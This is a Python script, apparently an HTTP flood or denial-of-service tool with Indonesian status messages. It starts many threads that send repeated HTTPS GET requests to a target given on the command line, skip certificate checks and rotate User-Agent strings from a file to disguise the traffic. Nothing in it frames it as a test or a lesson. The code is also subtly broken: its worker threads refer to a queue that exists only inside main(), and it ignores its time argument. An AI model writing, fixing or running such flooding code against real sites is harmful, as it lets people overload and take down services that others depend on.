import http.client
import ssl
import sys
import threading
from urllib.parse import urlparse
from queue import Queue

num_threads = int(sys.argv[4])
num_requests = int(sys.argv[3])
time = int(sys.argv[2])
url = sys.argv[1]

def send_request(user_agent):
    try:
        conn = http.client.HTTPSConnection(url, context=ssl._create_unverified_context())
        conn.request("GET", "/", headers={"User-Agent": user_agent})
        response = conn.getresponse()
        print("Response diterima:", response.status, response.reason)
        conn.close()
    except Exception as e:
        print("Terjadi kesalahan saat mengirim permintaan:", str(e))

def worker():
    while True:
        user_agent = user_agent_queue.get()
        for i in range(num_requests):
            send_request(user_agent)
        user_agent_queue.task_done()

def main():
    print("Master sedang berjalan")
    user_agent_queue = Queue()

    for i in range(num_threads):
        t = threading.Thread(target=worker)
        t.daemon = True
        t.start()

    for i in range(num_requests):
        with open("user-agents.txt", "r") as file:
            lines = file.readlines()
            for line in lines:
                user_agent_queue.put(line.strip())

    user_agent_queue.join()
    print("Permintaan terkirim:", num_requests * num_threads)

if __name__ == "__main__":
    main()